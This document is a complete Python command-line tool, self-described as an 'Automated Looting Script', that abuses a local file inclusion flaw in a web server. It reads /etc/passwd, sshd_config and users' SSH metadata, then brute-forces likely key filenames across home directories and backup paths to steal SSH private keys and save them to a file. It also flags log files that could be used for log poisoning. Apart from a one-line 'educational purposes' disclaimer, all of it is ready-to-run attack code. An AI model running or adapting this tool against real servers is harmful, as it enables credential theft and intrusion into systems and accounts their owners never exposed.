#!/usr/bin/env python3
import requests
import argparse
import sys
import urllib3
import time
import re
from requests.models import PreparedRequest
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GREEN = "\033[32m"
RED = "\033[31m"
ORANGE = "\033[33m"
RESET = "\033[0m"

BANNER = f"""
  _    ___ ___ ___ _  _______   _____ 
 | |  | __|_ _|_  ) |/ / __\\ \\ / / __|
 | |__| _| | | / /|   <| _| \\ V /\\__ \\
 |____|_| |___/___|_|\\_\\___| |_| |___/

LFI to SSH Private Keys - Automated Looting Script
"""

class RawPreparedRequest(PreparedRequest):
    def prepare_url(self, url, params):
        self.url = url
        return self.url

class RawSession(requests.Session):
    def prepare_request(self, request):
        prep = RawPreparedRequest()
        prep.prepare(
            method=request.method,
            url=request.url,
            headers=request.headers,
            files=request.files,
            data=request.data,
            params=request.params,
            auth=request.auth,
            json=request.json
        )
        return prep

def get_session(proxy, headers_list):
    session = RawSession()
    session.verify = False
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    if headers_list:
        for header in headers_list:
            parts = header.split(":", 1)
            if len(parts) == 2:
                session.headers[parts[0].strip()] = parts[1].strip()
    return session

def is_valid_shell(shell):
    shell_lower = shell.lower()
    non_interactive = ["/bin/false", "/bin/sync", "/usr/sbin/nologin", "/sbin/nologin"]
    return False if shell_lower in non_interactive or "nologin" in shell_lower else True

def check_passwd_file(url, proxy, verbose):
    session = get_session(proxy, None)
    try:
        response = session.get(url, timeout=10)
        if verbose:
            print(f"{ORANGE}[DEBUG]{RESET} Received /etc/passwd response:\n{response.text[:500]}")
        if re.search(r"^root:.*:0:0:.*$", response.text, re.MULTILINE):
            print(f"{GREEN}[+]{RESET} Valid /etc/passwd file found")
            return response.text
        else:
            print(f"{RED}[-]{RESET} /etc/passwd file does not appear valid")
    except requests.RequestException as e:
        print(f"{RED}[-]{RESET} Error fetching /etc/passwd: {e}")
    return None

def extract_active_users(passwd_content, verbose=False):
    valid_users = []
    for line in passwd_content.splitlines():
        parts = line.split(":")
        if len(parts) < 7:
            continue
        username, _, uid_str, _, _, home_dir, shell = parts
        try:
            uid = int(uid_str)
        except:
            uid = 9999
        if home_dir and is_valid_shell(shell):
            valid_users.append((username, home_dir, uid))
    if valid_users:
        print(f"{GREEN}[+]{RESET} Valid users exported:")
        for user, home, uid in valid_users:
            print("    {} -> {} (UID: {})".format(user, home, uid))
        return valid_users
    print(f"{RED}[-]{RESET} No valid users found")
    return []

def check_sshd_config(url, proxy, verbose):
    prefix = url.rsplit("etc/passwd", 1)[0] if "etc/passwd" in url else url
    sshd_url = prefix + "etc/ssh/sshd_config"
    session = get_session(proxy, None)
    try:
        response = session.get(sshd_url, timeout=10)
        if verbose:
            print(f"{ORANGE}[DEBUG]{RESET} Received /etc/ssh/sshd_config:")
        if response.status_code == 200 and response.text.strip():
            print(f"{GREEN}[+]{RESET} /etc/ssh/sshd_config file found")
            config = response.text
            pr_match = re.search(r"^\s*PermitRootLogin\s+(yes|no|prohibit-password)", config, re.MULTILINE)
            pa_match = re.search(r"^\s*PubkeyAuthentication\s+(yes|no)", config, re.MULTILINE)
            pwd_match = re.search(r"^\s*PasswordAuthentication\s+(yes|no)", config, re.MULTILINE)
            cra_match = re.search(r"^\s*ChallengeResponseAuthentication\s+(yes|no)", config, re.MULTILINE)
            pr_status = "enabled" if pr_match and pr_match.group(1).lower() == "yes" else "disabled"
            pa_status = "enabled" if pa_match and pa_match.group(1).lower() == "yes" else "disabled"
            pwd_status = "enabled" if pwd_match and pwd_match.group(1).lower() == "yes" else "disabled"
            cra_status = "enabled" if cra_match and cra_match.group(1).lower() == "yes" else "disabled"
            print(f"    PermitRootLogin: {pr_status}")
            print(f"    PubkeyAuthentication: {pa_status}")
            print(f"    PasswordAuthentication: {pwd_status}")
            print(f"    ChallengeResponseAuthentication: {cra_status}")
        else:
            print(f"{RED}[-]{RESET} /etc/ssh/sshd_config file not found or empty")
    except requests.RequestException as e:
        print(f"{RED}[-]{RESET} Error fetching /etc/ssh/sshd_config: {e}")

def check_ssh_metadata(base_url, users, proxy, verbose=False):
    print(f"{GREEN}[+]{RESET} Checking for SSH metadata (authorized_keys, known_hosts and .ssh/config)...")
    session = get_session(proxy, None)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
    found_ssh_users = set()
    metadata_files = ["authorized_keys", "known_hosts"]
    ext_variants = ["", ".bak", ".new", ".old", ".tmp"]
    for user, home, _ in users:
        for mfile in metadata_files:
            for ext in ext_variants:
                path = f"{home}/.ssh/{mfile}{ext}"
                payload = prefix + path.lstrip("/")
                try:
                    response = session.get(payload, timeout=10)
                    if response.status_code == 200 and response.text.strip():
                        print(f"{ORANGE}[!]{RESET} Found {mfile}{ext} for {user}: {payload}")
                        if mfile == "authorized_keys":
                            found_ssh_users.add(user)
                except requests.RequestException as e:
                    if verbose:
                        print(f"{RED}[-]{RESET} Error checking {mfile}{ext} for {user} at {payload}: {e}")
    return found_ssh_users

def check_ssh_config(user, home, prefix, proxy, verbose=False, all_users=None):
    found_identity_keys = []
    ext_variants = ["", ".bak", ".new", ".old", ".tmp"]
    session = get_session(proxy, None)
    for ext in ext_variants:
        config_path = f"{home}/.ssh/config{ext}"
        config_url = prefix + config_path.lstrip("/")
        try:
            response = session.get(config_url, timeout=10)
            if response.status_code == 200 and response.text.strip():
                print(f"{ORANGE}[!]{RESET} SSH config found for {user}: {config_url} - possible lateral movement")
                config_text = response.text
                current_host = None
                host_details = {}
                for line in config_text.splitlines():
                    line = line.strip()
                    if line.lower().startswith("host "):
                        if current_host and host_details:
                            print(f"    Host: {current_host}")
                            if any(k.lower() in ['hostname', 'user', 'port', 'identityfile'] for k in host_details):
                                if "HostName" in host_details:
                                    print(f"       HostName: {host_details['HostName']}")
                                if "User" in host_details:
                                    print(f"       User: {host_details['User']}")
                                if "Port" in host_details:
                                    print(f"       Port: {host_details['Port']}")
                                if "IdentityFile" in host_details:
                                    print(f"       IdentityFile: {host_details['IdentityFile']}")
                        current_host = line.split(None, 1)[1]
                        host_details = {}
                    elif current_host and line and " " in line:
                        key, value = line.split(None, 1)
                        host_details[key] = value
                if current_host and host_details:
                    print(f"    Host: {current_host}")
                    if any(k.lower() in ['hostname', 'user', 'port', 'identityfile'] for k in host_details):
                        if "HostName" in host_details:
                            print(f"       HostName: {host_details['HostName']}")
                        if "User" in host_details:
                            print(f"       User: {host_details['User']}")
                        if "Port" in host_details:
                            print(f"       Port: {host_details['Port']}")
                        if "IdentityFile" in host_details:
                            print(f"       IdentityFile: {host_details['IdentityFile']}")
                identity_files = re.findall(r'^\s*IdentityFile\s+(.*)$', config_text, re.MULTILINE)
                for idf in identity_files:
                    idf = idf.strip()
                    if not idf:
                        continue
                    if idf.startswith("~"):
                        new_path = idf[1:].lstrip("/")
                        candidate = f"{home}/{new_path}"
                        candidate_url = prefix + candidate.lstrip("/")
                        try:
                            idf_response = session.get(candidate_url, timeout=10)
                            if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
                                print(f"{RED}[!]{RESET} Private key found for {user} at: {candidate_url}")
                                found_identity_keys.append((user, candidate_url, idf_response.text))
                        except requests.RequestException as e:
                            if verbose:
                                print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
                        if all_users:
                            for other_user, other_home, _ in all_users:
                                if other_user == user:
                                    continue
                                candidate_other = f"{other_home}/{new_path}"
                                candidate_url_other = prefix + candidate_other.lstrip("/")
                                try:
                                    other_response = session.get(candidate_url_other, timeout=10)
                                    if other_response.status_code == 200 and "PRIVATE KEY-----" in other_response.text:
                                        print(f"{RED}[!]{RESET} Private key found for {other_user} at: {candidate_url_other}")
                                except requests.RequestException as e:
                                    if verbose:
                                        print(f"{RED}[-]{RESET} Error fetching IdentityFile for {other_user} at {candidate_url_other}: {e}")
                    elif not idf.startswith("/"):
                        candidate = f"{home}/.ssh/{idf}"
                        candidate_url = prefix + candidate.lstrip("/")
                        try:
                            idf_response = session.get(candidate_url, timeout=10)
                            if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
                                found_identity_keys.append((user, candidate_url, idf_response.text))
                           
                        except requests.RequestException as e:
                            if verbose:
                                print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
                    else:
                        candidate = idf
                        candidate_url = prefix + candidate.lstrip("/")
                        try:
                            idf_response = session.get(candidate_url, timeout=10)
                            if idf_response.status_code == 200 and "PRIVATE KEY-----" in idf_response.text:
                                found_identity_keys.append((user, candidate_url, idf_response.text))
                        except requests.RequestException as e:
                            if verbose:
                                print(f"{RED}[-]{RESET} Error fetching IdentityFile for {user} at {candidate_url}: {e}")
        except requests.RequestException as e:
            if verbose:
                print(f"{RED}[-]{RESET} Error fetching SSH config for {user} at {config_url}: {e}")
    return found_identity_keys

def fuzz_task(user, candidate_url, session, verbose, ignore_403):
    try:
        response = session.get(candidate_url, timeout=10)
        if response.status_code == 403 and not ignore_403:
            return "403"
        if response.status_code == 200 and "PRIVATE KEY-----" in response.text:
            if verbose:
                print(f"{ORANGE}[DEBUG]{RESET} Private key content for {user} from {candidate_url}:\n{response.text}")
            return (candidate_url, response.text)
    except requests.RequestException as e:
        if verbose:
            print(f"{RED}[-]{RESET} Error requesting {candidate_url}: {e}")
    return None

def fuzz_user(user, home, wordlist, prefix, session, all_flag, continue_on_success, verbose, ignore_403, usernames, no_rate_limit):
    ssh_dir_url = prefix + f"{home}/.ssh/".lstrip("/")
    home_dir_url = prefix + f"{home}/".lstrip("/")
    try:
        r_ssh = session.get(ssh_dir_url, timeout=10)
        if r_ssh.status_code == 403 and not ignore_403:
            if verbose:
                print(f"{ORANGE}[DEBUG]{RESET} {user} skipped because of 403")
            return []
    except:
        if verbose:
            print(f"{ORANGE}[DEBUG]{RESET} {user} skipped because of 403")
        return []
    try:
        r_home = session.get(home_dir_url, timeout=10)
        if r_home.status_code == 403 and not ignore_403:
            if verbose:
                print(f"{ORANGE}[DEBUG]{RESET} {user} skipped because of 403")
            return []
    except:
        if verbose:
            print(f"{ORANGE}[DEBUG]{RESET} {user} skipped because of 403")
        return []
    found = []
    candidates = []
    for key_name in wordlist:
        candidates.append(f"{home}/.ssh/{key_name}")
    ext_list = ["", ".bak", ".key", ".rsa", ".new", ".old", ".tmp"]
    for uname in usernames:
        candidates.append(f"{home}/.ssh/{uname}")
        for ext in ext_list[1:]:
            candidates.append(f"{home}/.ssh/{uname}{ext}")
    if all_flag:
        for key_name in wordlist:
            candidates.append(f"{home}/{key_name}")
        for uname in usernames:
            candidates.append(f"{home}/{uname}")
            for ext in ext_list[1:]:
                candidates.append(f"{home}/{uname}{ext}")
    candidates = list(dict.fromkeys(candidates))
    if session.proxies:
        for candidate in candidates:
            candidate_url = prefix + candidate.lstrip("/")
            result = fuzz_task(user, candidate_url, session, verbose, ignore_403)
            if result == "403":
                if verbose:
                    print(f"{ORANGE}[DEBUG]{RESET} {user} skipped because of 403")
                return []
            if result:
                print(f"{RED}[!]{RESET} Private key found for {user} at: {result[0]}")
                found.append(result)
                if not continue_on_success:
                    break
            if not no_rate_limit:
                time.sleep(1)
    else:
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_candidate = {
                executor.submit(fuzz_task, user, prefix + candidate.lstrip("/"), session, verbose, ignore_403): candidate
                for candidate in candidates
            }
            for future in as_completed(future_to_candidate):
                result = future.result()
                if result == "403":
                    if verbose:
                        print(f"{ORANGE}[DEBUG]{RESET} {user} skipped because of 403")
                    return []
                if result:
                    print(f"{RED}[!]{RESET} Private key found for {user} at: {result[0]}")
                    found.append(result)
                    if not continue_on_success:
                        break
    if verbose and not found:
        print(f"{ORANGE}[DEBUG]{RESET} No keys found for {user}, moving to next user.")
    return found

def fuzz_ssh_keys_for_users(base_url, users, wordlist, proxy, all_flag, continue_on_success, verbose, found_ssh_users, ignore_403, no_rate_limit):
    print(f"{GREEN}[+]{RESET} Starting to FUZZ")
    found_keys = []
    session = get_session(proxy, None)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
    usernames = [user for user, home, uid in users]
    ordered_users = sorted(
        users,
        key=lambda x: (0 if x[0] in found_ssh_users else 1, 0 if x[2] == 0 else (x[2] if x[2] < 1000 else 10000))
    )
    for user, home, _ in ordered_users:
        keys = fuzz_user(
            user, home, wordlist, prefix, session, all_flag, continue_on_success,
            verbose, ignore_403, usernames, no_rate_limit
        )
        found_keys.extend(keys)
    return found_keys

def fuzz_additional_paths(base_url, proxy, verbose, wordlist):
    extra_dirs = ["/etc/ssh/", "/opt/backups/", "/tmp/"]
    found = []
    session = get_session(proxy, None)
    prefix = base_url.rsplit("etc/passwd", 1)[0]
    for directory in extra_dirs:
        for key_name in wordlist:
            candidate_path = directory.rstrip("/") + "/" + key_name
            candidate_url = prefix + candidate_path.lstrip("/")
            try:
                response = session.get(candidate_url, timeout=10)
                if response.status_code == 200 and "PRIVATE KEY-----" in response.text:
                    if verbose:
                        print(f"{ORANGE}[DEBUG]{RESET} Private key content from {candidate_url}:\n{response.text}")
                    print(f"{RED}[!]{RESET} Private key found in additional directory: {candidate_url}")
                    found.append((candidate_url, response.text))
            except Exception as e:
                if verbose:
                    print(f"{RED}[-]{RESET} Error checking {candidate_url}: {e}")
    if not found:
        print(f"{GREEN}[+]{RESET} No accessible SSH keys found for additional directories")
    logs_found = []
    log_files = ["/var/log/auth.log", "/var/log/apache2/access.log", "/var/log/syslog", "/var/log/vsftpd.log", "/var/log/apache/error.log", "/var/log/main.log", "/var/log/nginx/error.log"]
    for path in log_files:
        candidate_url = prefix + path.lstrip("/")
        try:
            response = session.get(candidate_url, timeout=10)
            if response.status_code == 200 and len(response.text) > 50:
                print(f"{RED}[!]{RESET} Log file found: {candidate_url} - this file may be used for log poisoning if writable")
                logs_found.append(candidate_url)
            else:
                if verbose:
                    print(f"{ORANGE}[DEBUG]{RESET} No accessible log file at: {candidate_url}")
        except Exception as e:
            if verbose:
                print(f"{RED}[-]{RESET} Error checking log file at {candidate_url}: {e}")
    if not logs_found:
        print(f"{GREEN}[+]{RESET} No accessible log files detected for log poisoning")
    return found

def main():
    parser = argparse.ArgumentParser(
        description="Automated LFI to SSH private key looter",
        epilog="Common SSH private key names: https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists"
    )
    parser.add_argument("-u", "--url", required=True, help="LFI URL pointing to /etc/passwd")
    parser.add_argument("-l", "--list", required=True, help="Wordlist containing SSH private key names")
    parser.add_argument("-o", "--output", help="File to save found private key URLs and contents", default=None)
    parser.add_argument("-p", "--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)", default=None)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose mode for debugging")
    parser.add_argument("-a", "--all", action="store_true", help="Also search the entire home directory and additional paths")
    parser.add_argument("--ignore-403", action="store_true", help="Continue scanning even if a 403 status code is encountered")
    parser.add_argument("--no-rate-limit", action="store_true", help="Disable rate limiting on proxy (for debug/testing purposes)")
    parser.add_argument("-c", "--continue-on-success", action="store_true", help="Continue scanning all users for private keys even after a match is found")
    args = parser.parse_args()

    print(BANNER)
    print(f"{ORANGE}[*]{RESET} The script provided is for educational purposes only, I am not responsible for your actions.")
    if args.proxy and not args.no_rate_limit:
        print(f"{ORANGE}[*]{RESET} Proxy mode enabled; requests will be processed sequentially with a 1s delay.")

    passwd_content = check_passwd_file(args.url, args.proxy, args.verbose)
    if not passwd_content:
        sys.exit(f"{RED}[-]{RESET} Exiting due to invalid /etc/passwd response")
    valid_users = extract_active_users(passwd_content, args.verbose)
    if not valid_users:
        sys.exit(f"{RED}[-]{RESET} No valid users found, exiting")
    check_sshd_config(args.url, args.proxy, args.verbose)
    found_ssh_users = check_ssh_metadata(args.url, valid_users, args.proxy, args.verbose)
    prefix = args.url.rsplit("etc/passwd", 1)[0]
    identity_keys = []
    for user, home, _ in valid_users:
        identity_keys.extend(check_ssh_config(user, home, prefix, args.proxy, args.verbose, valid_users))
    with open(args.list, "r") as f:
        key_wordlist = [line.strip() for line in f if line.strip()]
    found_keys = fuzz_ssh_keys_for_users(
        args.url, valid_users, key_wordlist, args.proxy, args.all,
        args.continue_on_success, args.verbose, found_ssh_users, args.ignore_403, args.no_rate_limit
    )
    if args.all:
        extra_found = fuzz_additional_paths(args.url, args.proxy, args.verbose, key_wordlist)
        found_keys.extend(extra_found)
    all_found = identity_keys + [(None, url, content) for url, content in found_keys]
    if args.output and all_found:
        with open(args.output, "w") as f:
            entries = []
            for entry in all_found:
                user_str = entry[0] if entry[0] else "Unknown"
                entries.append("URL: " + entry[1] + "\nPRIVATE KEY:\n" + entry[2])
            f.write("\n\n".join(entries))
        print(f"{GREEN}[+]{RESET} Results saved to {args.output}")
    print(f"{GREEN}[+]{RESET} Done (～￣▽￣)～")

if __name__ == "__main__":
    main()
